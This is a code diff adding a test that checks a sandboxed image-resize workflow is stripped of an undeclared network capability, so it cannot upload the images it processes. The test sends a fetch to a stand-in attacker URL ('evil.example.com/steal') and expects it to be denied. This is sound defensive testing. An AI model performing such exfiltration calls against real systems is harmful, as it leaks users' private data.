@@ -172,6 +172,56 @@ test.each([
   await expect(lab.vfs.open(outPath, { read: true })).rejects.toThrow();
 }, T);
 
+// Capability narrowing (spec §8): the workflow (and the children it forks) must NOT
+// hold a `net` capability, even when the parent that spawned it does. This validates
+// the "privacy-first, no-upload" threat model: a long-lived compute guest cannot
+// exfiltrate the image bytes it processes. The workflow's `#!/bin/bash` interpreter and
+// its `imgresize`/`imgconvert` children each carry a file-borne `security.capability`
+// xattr grant (fs + process, NO net); exec-from-VFS narrows the effective grant against
+// the parent, so an undeclared `net` is denied even though we grant one to the spawn.
+test('resize-convert denies an undeclared net capability to the workflow and its children', async () => {
+  lab = await createLab({ persistStorage: null });
+  await seed(lab, '/in/photo.png', await fixturePng(40, 20));
+  await installResizeConvertWorkflow(lab.vfs);
+
+  // Spawn the workflow with a net capability in the PARENT grant — the workflow's own
+  // xattr grant (bash: fs + process) has no `net`, so exec-from-VFS drops it. The pid
+  // is registered (caps granted, guest still running) the instant `spawn` resolves, so
+  // we inspect the effective grant before the fast workflow can exit and revoke it.
+  const { pid, stdout } = await lab.kernel.spawn('resize-convert', {
+    args: ['resize-convert', '16', 'webp', '/in/photo.png', '/out/photo.webp'],
+    env: { PATH: '/usr/bin:/bin' },
+    cwd: '/',
+    capabilities: [
+      { type: 'fs', paths: ['/'], operations: ['read', 'write', 'execute'] },
+      { type: 'net', origins: ['https://evil.example.com'] },
+      { type: 'process', maxChildren: 16 },
+    ],
+    captureStdout: true,
+  });
+
+  // The effective grant of the running workflow carries NO net capability (the xattr
+  // grant narrowed it away), so a network origin is denied at the capability gate.
+  expect(lab.kernel.capabilities.capabilities(pid).some((c) => c.type === 'net')).toBe(false);
+  expect(lab.kernel.capabilities.checkNet(pid, 'https://evil.example.com/steal')).toBe(false);
+
+  // The syscall gate agrees: a `net/fetch` from the workflow pid is EACCES (denied
+  // before any HTTP client is invoked — the capability check fails first).
+  const { response } = await lab.kernel.dispatcher.dispatch(pid, {
+    id: 1, call: 'net/fetch', args: { method: 'GET', url: 'https://evil.example.com/steal' },
+  });
+  expect(response.ok).toBe(false);
+  expect((response as { ok: false; error: { code: string } }).error.code).toBe('EACCES');
+
+  // The workflow still runs to completion over its (fs + process) grant, proving the
+  // narrowing removed only `net` — not the caps the workflow legitimately needs.
+  const { code } = await lab.kernel.wait(pid);
+  expect(code).toBe(0);
+  if (stdout) await stdout;
+  const out = await readVfs(lab, '/out/photo.webp');
+  expect(new TextDecoder().decode(out.subarray(0, 4))).toBe('RIFF');
+}, T);
+
 test('resize-convert never upscales: a target wider than the source is clamped to source width', async () => {
   lab = await createLab({ persistStorage: null });
   await seed(lab, '/in/photo.png', await fixturePng(40, 20));
